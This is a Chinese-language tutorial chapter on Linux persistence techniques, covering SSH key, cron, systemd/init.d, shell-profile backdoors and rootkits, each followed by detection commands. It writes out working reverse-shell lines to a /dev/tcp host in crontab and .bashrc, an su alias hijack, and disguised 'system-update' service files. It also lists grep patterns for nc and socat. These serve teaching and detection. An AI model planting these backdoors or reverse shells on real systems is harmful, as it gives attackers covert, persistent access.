# Linux 权限维持

### 5.1 SSH 密钥后门

**原理**

SSH 公钥认证是一种常见的认证方式。攻击者可以将自己的公钥添加到目标主机的 authorized_keys 文件中，从而实现持久化访问。

**SSH 密钥持久化方法**

```bash
# 1. 直接追加公钥到 authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@host" >> ~/.ssh/authorized_keys

# 2. 确保目录权限正确
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# 3. 更隐蔽的方式 - 使用 authorized_keys 选项
# 限制来源 IP、执行特定命令等
echo 'command="echo hacked",no-pty,no-port-forwarding ssh-rsa AAAAB3... attacker@host' >> ~/.ssh/authorized_keys
```

**SSH 密钥后门检测**

```bash
# 查看所有 authorized_keys 文件
find / -name "authorized_keys" -type f 2>/dev/null

# 查看所有私钥文件
find / -name "id_*" -type f ! -name "*.pub" 2>/dev/null

# 检查 authorized_keys 内容
cat ~/.ssh/authorized_keys
cat /root/.ssh/authorized_keys

# 检查 SSH 配置
cat /etc/ssh/sshd_config | grep -i authorizedkeysfile
```

### 5.2 Crontab 后门

**原理**

Cron 计划任务可以定期执行命令，是最常见的持久化方式之一。

**常见 Cron 后门位置**

```bash
# 1. 用户 crontab
crontab -e
crontab -l

# 2. 系统 crontab
cat /etc/crontab

# 3. cron.d 目录
ls -la /etc/cron.d/

# 4. 周期任务目录
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# 5. 用户 crontab 文件
ls -la /var/spool/cron/crontabs/  # Debian/Ubuntu
ls -la /var/spool/cron/           # CentOS/RHEL
```

**Cron 后门示例**

```bash
# 反弹 shell（每分钟执行）
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'" | crontab -

# 更隐蔽的方式 - 添加到系统 cron.d
cat > /etc/cron.d/system-update << 'EOF'
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=""
*/5 * * * * root /usr/bin/system-update.sh
EOF

# 脚本中隐藏后门
echo "*/30 * * * * root /usr/bin/apt-get update" > /etc/cron.d/apt-update
# 实际脚本中包含后门
```

**Cron 后门检测**

```bash
# 列出所有 crontab
for user in $(cut -f1 -d: /etc/passwd); do echo "=== $user ==="; crontab -u $user -l 2>/dev/null; done

# 检查所有 cron 相关文件
find /etc/cron* -type f -exec ls -la {} \;
find /var/spool/cron* -type f -exec ls -la {} \;

# 查看 cron 日志
grep CRON /var/log/syslog
grep CRON /var/log/cron
```

### 5.3 系统服务后门

**Systemd 服务后门**

```bash
# 创建恶意 systemd 服务
cat > /etc/systemd/system/system-update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/system-update.sh
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

# 启用并启动服务
systemctl daemon-reload
systemctl enable system-update.service
systemctl start system-update.service
```

**init.d 服务后门**

```bash
# 创建 init.d 脚本
cat > /etc/init.d/system-update << 'EOF'
#!/bin/bash
# chkconfig: 2345 99 01
# description: System Update Service

case "$1" in
    start)
        /usr/bin/system-update.sh &
        ;;
    stop)
        killall system-update.sh
        ;;
    *)
        echo "Usage: $0 {start|stop}"
        exit 1
        ;;
esac
exit 0
EOF

chmod +x /etc/init.d/system-update

# CentOS/RHEL
chkconfig --add system-update
chkconfig system-update on

# Debian/Ubuntu
update-rc.d system-update defaults
```

**服务后门检测**

```bash
# 列出所有 systemd 服务
systemctl list-unit-files --type=service
systemctl list-units --type=service --all

# 列出所有 init.d 服务
ls -la /etc/init.d/
chkconfig --list  # CentOS/RHEL
service --status-all  # Debian/Ubuntu

# 检查非标准服务
systemctl list-unit-files --type=service | grep -v '@' | grep -v '.mount' | grep -v 'sysinit'

# 检查服务文件内容
cat /etc/systemd/system/malicious.service
```

### 5.4 Shell 配置文件后门

**原理**

Shell 配置文件在用户登录或打开终端时执行，可以用于持久化后门。

**常见 Shell 配置文件**

```bash
# 全局配置
/etc/profile
/etc/bashrc
/etc/profile.d/
/etc/zsh/zshrc

# 用户级配置
~/.bashrc
~/.bash_profile
~/.bash_login
~/.profile
~/.zshrc
~/.cshrc
~/.tcshrc
```

**Shell 配置文件后门示例**

```bash
# 在 .bashrc 中添加反弹 shell
echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &" >> ~/.bashrc

# 更隐蔽的方式 - 别名劫持
echo "alias su='bash -c \"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &\"; su'" >> ~/.bashrc

# 使用 PROMPT_COMMAND（每次命令执行后运行）
echo "PROMPT_COMMAND='(/usr/local/bin/backdoor &)'" >> ~/.bashrc

# 利用 /etc/profile.d/
cat > /etc/profile.d/update.sh << 'EOF'
#!/bin/bash
# System update script
/usr/local/bin/update_check &
EOF
chmod +x /etc/profile.d/update.sh
```

**Shell 配置后门检测**

```bash
# 检查所有用户的 shell 配置文件
for user in $(cut -f1 -d: /etc/passwd); do
    home=$(getent passwd $user | cut -d: -f6)
    echo "=== $user ==="
    [ -f "$home/.bashrc" ] && cat "$home/.bashrc" | grep -i "bash -i\|nc\|reverse\|ncat\|socat"
    [ -f "$home/.bash_profile" ] && cat "$home/.bash_profile" | grep -i "bash -i\|nc\|reverse"
    [ -f "$home/.profile" ] && cat "$home/.profile" | grep -i "bash -i\|nc\|reverse"
done

# 检查全局配置
grep -r "bash -i\|reverse_shell\|nc.*-e\|socat" /etc/profile* /etc/bash* /etc/zsh/ 2>/dev/null

# 检查 profile.d 目录
ls -la /etc/profile.d/
```

### 5.5 Rootkit

**Rootkit 概述**

Rootkit 是一种高级恶意软件，旨在隐藏自身和其他恶意程序的存在，同时保持对系统的特权访问。Rootkit 通常工作在内核层，难以检测和清除。

**Rootkit 类型**

| 类型 | 描述 | 检测难度 |
|------|------|----------|
| 用户态 Rootkit | 修改用户态工具（ps、ls、netstat 等） | 低 |
| 内核态 Rootkit | 加载内核模块，修改内核函数 | 高 |
| 固件 Rootkit | 植入硬件固件（BIOS、硬盘固件等） | 极高 |
| 内存 Rootkit | 仅存在于内存中，不写入磁盘 | 中 |

**常见 Rootkit 技术**

1. **系统调用劫持**：修改系统调用表（sys_call_table），替换关键系统调用
2. **LKM Rootkit**：通过可加载内核模块（LKM）修改内核
3. **符号劫持**：修改动态链接器，替换库函数
4. **进程隐藏**：修改进程列表，隐藏恶意进程
5. **文件隐藏**：修改文件系统调用，隐藏恶意文件
6. **端口隐藏**：修改网络系统调用，隐藏网络连接

**Rootkit 检测工具**

```bash
# chkrootkit
chkrootkit
chkrootkit -q  # 静默模式，只输出可疑项

# rkhunter (Rootkit Hunter)
rkhunter --check
rkhunter --update  # 更新特征库
rkhunter --propupd  # 更新文件属性数据库

# 检查内核模块
lsmod
modinfo module_name

# 检查可疑的内核模块
cat /proc/modules
ls -la /lib/modules/$(uname -r)/

# 检查 /proc 和 /sys
# 对比 ps 和 /proc 中的进程数
ps -ef | wc -l
ls /proc | grep -E '^[0-9]+$' | wc -l

# 检查系统二进制文件完整性
rpm -Va  # CentOS/RHEL
dpkg -V  # Debian/Ubuntu
debsums -c  # Debian/Ubuntu
```

**著名 Linux Rootkit**

- Suckit：经典的 Linux Rootkit
- Adore：LKM Rootkit
- Knark：2.2/2.4 内核的 Rootkit
- Suterusu：现代 Linux Rootkit
- Diamorphine：开源的 LKM Rootkit
- Reptile：开源 Rootkit 框架

---

---

## 📋 内容审核与补充建议

> 针对「Linux 权限维持」部分的内容审核结果：

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
